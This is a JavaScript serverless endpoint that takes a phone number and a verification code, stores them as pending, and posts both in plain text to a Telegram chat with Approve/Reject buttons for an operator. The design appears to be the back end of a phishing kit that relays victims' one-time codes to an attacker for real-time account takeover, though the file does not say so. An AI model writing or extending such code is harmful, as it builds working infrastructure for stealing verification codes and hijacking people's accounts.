// /api/verify-code.js (ESM) — sends Approve/Reject buttons
import { setJSON, hset } from "../lib/upstash.js";

const BOT = process.env.TELEGRAM_BOT_TOKEN;
const CHAT = process.env.TELEGRAM_CHAT_ID;

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ ok: false, error: "Method Not Allowed" });
  try {
    const payload = typeof req.body === "string" ? JSON.parse(req.body) : (req.body || {});
    const { phone, code, requestId } = payload;
    if (!phone || !code) return res.status(400).json({ ok: false, error: "phone and code required" });

    // record pending
    try { await hset(`phone:${phone}`, { lastCode: code, status: "pending", approved: "", ts: Date.now() }); } catch {}

    const text = `🔐 <b>Code received</b>\nPhone: <code>${phone}</code>\nCode: <code>${code}</code>` + (requestId ? `\nReqID: <code>${requestId}</code>` : "");
    const keyboard = { inline_keyboard: [[
      { text: "✅ Approve", callback_data: `approve:${phone}:${code}` },
      { text: "❌ Reject",  callback_data: `reject:${phone}:${code}` }
    ]]};

    // send keyboard
    if (!BOT || !CHAT) return res.status(500).json({ ok:false, error:"telegram envs missing" });
    const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT, text, parse_mode: "HTML", reply_markup: keyboard })
    });
    if (!r.ok) {
      return res.status(500).json({ ok:false, error:`telegram ${r.status}: ${await r.text()}` });
    }

    // optional: store for 15 min
    try { await setJSON(`code:${code}`, { phone, ts: Date.now() }, 900); } catch {}

    return res.json({ ok: true });
  } catch (e) {
    return res.status(500).json({ ok: false, error: e?.message || "server error" });
  }
}
